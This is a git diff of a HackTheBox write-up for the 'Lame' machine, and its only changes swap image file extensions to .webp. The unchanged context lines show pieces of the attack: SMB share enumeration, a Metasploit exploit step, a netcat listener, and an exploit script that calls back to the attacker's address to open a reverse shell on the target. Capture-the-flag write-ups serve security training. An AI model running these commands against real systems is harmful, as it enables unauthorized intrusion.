@@ -5,11 +5,11 @@ summary: This is the summary for an awesome post.
 tags: hackthebox, writeup
 
 ## Overview
-![writeup.metadata.infocard](/static/files/posts_htb_lame/infocard.png)
+![writeup.metadata.infocard](/static/files/posts_htb_lame/infocard.png.webp)
 
 This is a writeup for HTB VM [Lame](htps://www.hackthebox.eu/home/machines/profile/1). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_htb_lame/killchain.png)
+![writeup.overview.killchain](/static/files/posts_htb_lame/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -77,9 +77,9 @@ msfconsole
   exploit
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_htb_lame/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_htb_lame/screenshot01.png.webp)  
 
-![writeup.enumeration.steps.2.2](/static/files/posts_htb_lame/screenshot02.png)  
+![writeup.enumeration.steps.2.2](/static/files/posts_htb_lame/screenshot02.png.webp)  
 
 3\. We then explore the open (read+write) SMB share `tmp` but since there is no service (like HTTP for example) to leverage uploaded files, we move on:  
 ```
@@ -87,7 +87,7 @@ smbclient \\\\10.10.10.3\\tmp
   dir
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_htb_lame/screenshot03.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_htb_lame/screenshot03.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -105,9 +105,9 @@ nc -nlvp 443
 python usermap_script.py 10.10.10.3 139 10.10.14.18 443
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_htb_lame/screenshot04.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_htb_lame/screenshot04.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_htb_lame/screenshot05.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_htb_lame/screenshot05.png.webp)  
 
 2\. We then read the contents of both `user.txt` and `root.txt` files to complete the challenge:  
 ```
@@ -115,7 +115,7 @@ cat /home/makis/user.txt
 cat /root/root.txt
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_htb_lame/screenshot06.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_htb_lame/screenshot06.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
